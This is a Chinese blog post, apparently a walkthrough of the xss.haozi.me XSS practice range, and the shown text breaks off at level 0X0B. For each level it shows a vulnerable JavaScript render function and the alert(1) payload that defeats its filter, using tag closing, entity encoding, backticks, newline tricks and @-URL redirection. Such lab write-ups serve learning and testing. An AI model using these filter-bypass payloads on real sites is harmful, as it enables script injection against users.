{"title":"XSS常见绕过姿势和绕某狗WAF所用标签小记","uid":"ff5ef1580e1509b5812626f28a444a2d","slug":"XSS.haozi.me刷题","date":"2022-07-11T10:32:20.000Z","updated":"2024-02-14T08:02:06.000Z","comments":true,"path":"api/articles/XSS.haozi.me刷题.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141602387.jpeg","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>XSS学习过后，想刷一些题，github找到一个，链接如下<br><a href=\"https://xss.haozi.me/\">https://xss.haozi.me/</a></p>\n<h2 id=\"0X00\"><a href=\"#0X00\" class=\"headerlink\" title=\"0X00\"></a>0X00</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">function render <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token char\">'&lt;div>'</span> <span class=\"token operator\">+</span> input <span class=\"token operator\">+</span> <span class=\"token char\">'&lt;/div>'</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537199.png\" alt=\"在这里插入图片描述\"><br>看到服务端是没有任何防护的，直接简单的xss语句即可</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>script<span class=\"token punctuation\">></span></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537291.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"0X01\"><a href=\"#0X01\" class=\"headerlink\" title=\"0X01\"></a>0X01</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">function render <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">return</span> '<span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>textarea<span class=\"token punctuation\">></span></span>' <span class=\"token operator\">+</span> input <span class=\"token operator\">+</span> '<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>textarea<span class=\"token operator\">></span>'\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537243.png\" alt=\"在这里插入图片描述\"><br>发现前后多了个<code>&lt;textarea&gt;</code>标签，那我们这里的话，直接把前面给闭合了，后面就可控了，此时再插入我们的xss语句即可</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>textarea<span class=\"token operator\">></span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>script<span class=\"token punctuation\">></span></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537226.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"0X02\"><a href=\"#0X02\" class=\"headerlink\" title=\"0X02\"></a>0X02</h2><h3 id=\"方法一\"><a href=\"#方法一\" class=\"headerlink\" title=\"方法一\"></a>方法一</h3><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">function render <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">return</span> '<span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string\">\"name\"</span> value<span class=\"token operator\">=</span><span class=\"token string\">\"' + input + '\"</span><span class=\"token operator\">></span>'\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537249.png\" alt=\"在这里插入图片描述\"><br>这题的话看后端代码是把值加到value里了，同时把这个限制到了input里，那我们这里可以把value闭合，把input标签也闭合，然后写入自己的语句，此时即可实现xss</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">\"<span class=\"token operator\">></span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>script<span class=\"token punctuation\">></span></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537319.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"方法二\"><a href=\"#方法二\" class=\"headerlink\" title=\"方法二\"></a>方法二</h3><p>input语句中也可以实现xss，我们把value闭合后，可以添加onclick属性，来实现xss，构造payload如下</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token string\">\" onclick=\"</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537965.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"0X03\"><a href=\"#0X03\" class=\"headerlink\" title=\"0X03\"></a>0X03</h2><h3 id=\"实体编码绕过\"><a href=\"#实体编码绕过\" class=\"headerlink\" title=\"实体编码绕过\"></a>实体编码绕过</h3><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">function render <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">const</span> stripBracketsRe <span class=\"token operator\">=</span> <span class=\"token operator\">/</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token operator\">/</span>g\n  input <span class=\"token operator\">=</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span>stripBracketsRe<span class=\"token punctuation\">,</span> ''<span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">return</span> input\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537010.png\" alt=\"在这里插入图片描述\"><br><code>/g</code>修饰符用于执行全局匹配（查找所有匹配而非在找到第一个匹配后停止）。<br>总之这里的过滤就是过滤了<code>()</code>，这个时候的话我们的思路有一个就是编码绕过，我们的属性在标签中，在触发前就对其进行了一次解码，因此我们这里可以进行编码绕过，构造payload如下</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token operator\">&lt;</span>a href<span class=\"token operator\">=</span>javascript<span class=\"token operator\">:</span><span class=\"token operator\">&amp;</span>#<span class=\"token number\">97</span><span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#<span class=\"token number\">108</span><span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#<span class=\"token number\">101</span><span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#<span class=\"token number\">114</span><span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#<span class=\"token number\">116</span><span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#<span class=\"token number\">40</span><span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#<span class=\"token number\">49</span><span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#<span class=\"token number\">41</span><span class=\"token operator\">></span><span class=\"token number\">123</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>a<span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537045.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"反引号绕过\"><a href=\"#反引号绕过\" class=\"headerlink\" title=\"反引号绕过\"></a>反引号绕过</h3><p>可以用`来代替括号，构造payload如下</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>script<span class=\"token punctuation\">></span></span>alert`<span class=\"token number\">1</span>`<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537181.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"0X04\"><a href=\"#0X04\" class=\"headerlink\" title=\"0X04\"></a>0X04</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">function render <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">const</span> stripBracketsRe <span class=\"token operator\">=</span> <span class=\"token operator\">/</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>`<span class=\"token punctuation\">]</span><span class=\"token operator\">/</span>g\n  input <span class=\"token operator\">=</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span>stripBracketsRe<span class=\"token punctuation\">,</span> ''<span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">return</span> input\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>相比上关多过滤了反引号，这里沿用上关思路即可，编码绕过</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token operator\">&lt;</span>a href<span class=\"token operator\">=</span>javascript<span class=\"token operator\">:</span><span class=\"token operator\">&amp;</span>#x61<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x6c<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x65<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x72<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x74<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x28<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x31<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x29<span class=\"token punctuation\">;</span><span class=\"token operator\">></span><span class=\"token number\">123</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>a<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537390.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"0X05\"><a href=\"#0X05\" class=\"headerlink\" title=\"0X05\"></a>0X05</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">function render <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  input <span class=\"token operator\">=</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span><span class=\"token operator\">--</span><span class=\"token operator\">></span><span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'😂'</span><span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">return</span> <span class=\"token char\">'&lt;!-- '</span> <span class=\"token operator\">+</span> input <span class=\"token operator\">+</span> <span class=\"token char\">' -->'</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里把内容都给注释了，毋庸置疑这里我们需要闭合这个注释符，但是过滤了<code>--&gt;</code>，不过我们还可以用<code>--!&gt;</code>来进行闭合，构造payload如下</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token operator\">--</span><span class=\"token operator\">!</span><span class=\"token operator\">></span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>script<span class=\"token punctuation\">></span></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537532.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"0X06\"><a href=\"#0X06\" class=\"headerlink\" title=\"0X06\"></a>0X06</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">function render <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  input <span class=\"token operator\">=</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span>auto<span class=\"token operator\">|</span>on<span class=\"token punctuation\">.</span>*<span class=\"token operator\">=</span><span class=\"token operator\">|</span><span class=\"token operator\">></span><span class=\"token operator\">/</span>ig<span class=\"token punctuation\">,</span> <span class=\"token char\">'_'</span><span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">return</span> `<span class=\"token operator\">&lt;</span>input value<span class=\"token operator\">=</span><span class=\"token number\">1</span> $<span class=\"token punctuation\">&#123;</span>input<span class=\"token punctuation\">&#125;</span> type<span class=\"token operator\">=</span><span class=\"token string\">\"text\"</span><span class=\"token operator\">></span>`\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里的话可以看见是过滤了<code>auto.*=</code>和<code>on.*=</code>以及<code>&gt;</code>，防护的很好，但仍存在一些漏洞，就是这个他过滤的这个属性和<code>=</code>是无缝衔接的，如果我们进行换行，让他不满足这个过滤条件，那么这个过滤不加无效了吗，构造payload如下</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">onclick\n<span class=\"token operator\">=</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537903.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"0X07\"><a href=\"#0X07\" class=\"headerlink\" title=\"0X07\"></a>0X07</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">function render <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">const</span> stripTagsRe <span class=\"token operator\">=</span> <span class=\"token operator\">/</span><span class=\"token operator\">&lt;</span>\\<span class=\"token operator\">/</span><span class=\"token operator\">?</span><span class=\"token punctuation\">[</span><span class=\"token operator\">^</span><span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">/</span>gi\n\n  input <span class=\"token operator\">=</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span>stripTagsRe<span class=\"token punctuation\">,</span> ''<span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">return</span> `<span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>article<span class=\"token punctuation\">></span></span>$<span class=\"token punctuation\">&#123;</span>input<span class=\"token punctuation\">&#125;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>article<span class=\"token operator\">></span>`\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里的话不难看出是过滤了<code>&lt;&gt;</code>这个标签，但单个的<code>&lt;</code>和<code>&gt;</code>仍是可以使用的，这个时候我们可以借助注释符来实现闭合，构造payload如下</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token operator\">&lt;</span>img src<span class=\"token operator\">=</span><span class=\"token number\">1</span> onerror<span class=\"token operator\">=</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537971.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"0X08\"><a href=\"#0X08\" class=\"headerlink\" title=\"0X08\"></a>0X08</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">function render <span class=\"token punctuation\">(</span>src<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  src <span class=\"token operator\">=</span> src<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span><span class=\"token operator\">&lt;</span>\\<span class=\"token operator\">/</span>style<span class=\"token operator\">></span><span class=\"token operator\">/</span>ig<span class=\"token punctuation\">,</span> '<span class=\"token comment\">/* \\u574F\\u4EBA */</span>'<span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">return</span> `\n    <span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>style<span class=\"token punctuation\">></span></span>\n      $<span class=\"token punctuation\">&#123;</span>src<span class=\"token punctuation\">&#125;</span>\n    <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>style<span class=\"token operator\">></span>\n  `\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>过滤了<code>&lt;/style&gt;</code>，同之前类似，可采用空格和换行绕过</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>style <span class=\"token operator\">></span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>script<span class=\"token punctuation\">></span></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>style\n<span class=\"token operator\">></span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>script<span class=\"token punctuation\">></span></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537031.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"0X09\"><a href=\"#0X09\" class=\"headerlink\" title=\"0X09\"></a>0X09</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">function render <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  let domainRe <span class=\"token operator\">=</span> <span class=\"token operator\">/</span><span class=\"token operator\">^</span>https<span class=\"token operator\">?</span><span class=\"token operator\">:</span>\\<span class=\"token operator\">/</span>\\<span class=\"token operator\">/</span>www\\<span class=\"token punctuation\">.</span>segmentfault\\<span class=\"token punctuation\">.</span>com<span class=\"token operator\">/</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>domainRe<span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> `<span class=\"token operator\">&lt;</span>script src<span class=\"token operator\">=</span><span class=\"token string\">\"$&#123;input&#125;\"</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span>`\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">return</span> '<span class=\"token class-name\">Invalid</span> URL'\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里的要求就是input的需要含有<code>https://www.segmentfault.com</code>，这个时候我们看语句的话，发现它是被一对双引号包裹的，我们输入一个双引号就可以实现自由插入属性，但此时是不能够xss的，所以我们需要再闭合标签，即添加<code>&quot;&gt;&lt;/script&gt;</code>来闭合，而后添加我们的语句即可</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">https<span class=\"token operator\">:</span><span class=\"token operator\">/</span><span class=\"token operator\">/</span>www<span class=\"token punctuation\">.</span>segmentfault<span class=\"token punctuation\">.</span>com<span class=\"token string\">\">&lt;/script>&lt;img src=\"</span>\" onerror<span class=\"token operator\">=</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span>\nhttps<span class=\"token operator\">:</span><span class=\"token operator\">/</span><span class=\"token operator\">/</span>www<span class=\"token punctuation\">.</span>segmentfault<span class=\"token punctuation\">.</span>com\"<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>script<span class=\"token punctuation\">></span></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537396.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"0X0A\"><a href=\"#0X0A\" class=\"headerlink\" title=\"0X0A\"></a>0X0A</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">function render <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  function <span class=\"token function\">escapeHtml</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span><span class=\"token operator\">&amp;</span><span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'&amp;amp;'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span><span class=\"token char\">'/g, '</span><span class=\"token operator\">&amp;</span>#<span class=\"token number\">39</span><span class=\"token punctuation\">;</span>'<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span>\"<span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'&amp;quot;'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'&amp;lt;'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span><span class=\"token operator\">></span><span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'&amp;gt;'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span>\\<span class=\"token operator\">/</span><span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'&amp;#x2f'</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">const</span> domainRe <span class=\"token operator\">=</span> <span class=\"token operator\">/</span><span class=\"token operator\">^</span>https<span class=\"token operator\">?</span><span class=\"token operator\">:</span>\\<span class=\"token operator\">/</span>\\<span class=\"token operator\">/</span>www\\<span class=\"token punctuation\">.</span>segmentfault\\<span class=\"token punctuation\">.</span>com<span class=\"token operator\">/</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>domainRe<span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> `<span class=\"token operator\">&lt;</span>script src<span class=\"token operator\">=</span><span class=\"token string\">\"$&#123;escapeHtml(input)&#125;\"</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span>`\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">return</span> '<span class=\"token class-name\">Invalid</span> URL'\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里发现过滤了很多，<code>&amp;、/、&lt;、&gt;、/、&#39;</code>这些都被ban了，这里的话就需要一个知识点了，在SSRF中也比较常用，就是添加@，看似是访问前者，实际访问的是后者，比如访问<code>https://wwwbaidu.com@quan9i.top</code>时，实际访问的就是<code>https://quan9i.top</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537675.png\" alt=\"在这里插入图片描述\"><br>这里的话我们可以发现作者在靶场中留下了一个<code>j.js</code>文件，我们就可以让它访问这个，从而触发xss<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537354.png\" alt=\"在这里插入图片描述\"><br>构造payload如下（用火狐浏览器）</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">https<span class=\"token operator\">:</span><span class=\"token operator\">/</span><span class=\"token operator\">/</span>www<span class=\"token punctuation\">.</span>segmentfault<span class=\"token punctuation\">.</span>com<span class=\"token annotation punctuation\">@xss.haozi.me</span><span class=\"token operator\">/</span>j<span class=\"token punctuation\">.</span>js<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537003.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"0X0B\"><a href=\"#0X0B\" class=\"headerlink\" title=\"0X0B\"></a>0X0B</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">function render <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  input <span class=\"token operator\">=</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">toUpperCase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">return</span> `<span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>h1<span class=\"token punctuation\">></span></span>$<span class=\"token punctuation\">&#123;</span>input<span class=\"token punctuation\">&#125;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>h1<span class=\"token operator\">></span>`\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p><code>toUpperCase()</code>函数使得输入的内容全为大写，本来我构造的payload是这样的</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token operator\">&lt;</span>a href<span class=\"token operator\">=</span>javascript<span class=\"token operator\">:</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">123</span><span class=\"token comment\">//</span><span aria-hidden=\"true\" 